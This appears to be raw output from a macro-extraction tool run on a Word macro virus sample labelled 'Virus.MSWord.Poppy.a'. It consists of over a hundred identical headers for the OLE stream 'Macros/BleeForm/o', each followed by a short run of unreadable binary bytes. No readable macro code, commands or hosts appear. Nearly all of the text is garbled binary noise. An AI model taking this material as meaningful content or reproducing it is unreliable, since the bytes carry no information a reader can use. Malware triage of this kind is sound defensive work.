VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I�Ҥ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��i�Mª�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E\FZ:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z�O�}2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cH{uS|����I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�K�ɒ����lz|���F�W�!��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��TZ�K�F�jDK\0RHњ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GVj��vث��t����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}��=��5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=cgz�g%�)(�FF�a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}�$c�}y�~������}�)��Z)j<���R6�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�YXYO ,���Q�ſ(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wr����	d��1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]ԔQ�A<c���N
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+zv\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �˟L{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�vb=A���гFQA.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�x���Qͱ�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�C; �
ͻ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�T�We����;*��>��z��Q44�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c$Ȼ~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I��J�l�P[ "XZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,R�!��Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pv������2:r��[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%W�� 2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��Z*����\�Ț
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�wm��H��>����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Dr(�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X���RC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�V0��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�־*��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��EӃT��"�¤O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H��9$(^[�s�s֘v�HS-�ON����p�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g��N=�n�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J���х
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s��Go�QP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2����9# 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������JO�H]�u^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��O���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���A#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߨ?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t&�зMW�k���E���+��*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ہ�p98��\-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	�)01�A�q��=d��#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.������;����V�O��pV���_"�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���g��
#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`7"`��#��&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?|Rw^�����tE���f��ɥ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rG�a$���[`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j�7s����=@&��X�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��G�������R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U=�k��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}��$� d��`q�s��N.�R�d�BR��X��w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n>^3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ԝ�?�4b8۠�<z���"R���DSQ��,˵K1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��sYJ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��G̣��wq�]Z�(�
�"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ۦ��-�D�[��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@;rq�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�r!�\pS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D��$o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=ǧ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�45�MOS$3�/�E;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x�?+)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�__^�V�-4f(&l1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�.�KM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�0dL��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}3���2�DhR���huZ��:~!ڧ�Zb��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|uY�]�<�>�p�����<���;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���BNJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���70�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B�L�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'�~��v{�&��5�b���Ҥo
6I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ߜ��:�^�x�ѕ5t�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
₤�F�.ʄ����ĊI'*O$���θ�R��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t���}<�}�s��r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n����}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P\�)�h!��EV3;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_���>�c����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���J�)`��\"�)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�հq��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z)�F��23�[#�������N�ae+��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*M��R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$q� e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'#9'׃�����	"�jV4_0�ߔ���O�%�鵧���$5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�D8$����9�@_|AXlH�nQ�ʃi�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����Gr�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KL��k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�����G# ~�=4/�"��)+�ǘ��*���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�͡�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�2G*��}1�ӥkŦ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q� 1.���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nɮ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�ᘩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z\q��\~(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�]r��֥��m�/ ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8'����:�>��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Q2R)3�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?3c��c�׎���G��@� �V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�O��z����Ɯg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P��:�))�>6۩̑��P�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3"*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}z�ݴ�ܝ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T��U���k�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-J**
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1�&��|�a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C`�R���Vh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GVI�ޫjd��E<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Шb,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.vɨc��\gM�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�ѤA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I,m���R5�\�0T������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!妍�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{/5Ή���/��W���!�Sރ$ZOU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\@2X����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� b$��,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
us�T�\&���h�W"DEe���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���~��L4���
Xu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��UG
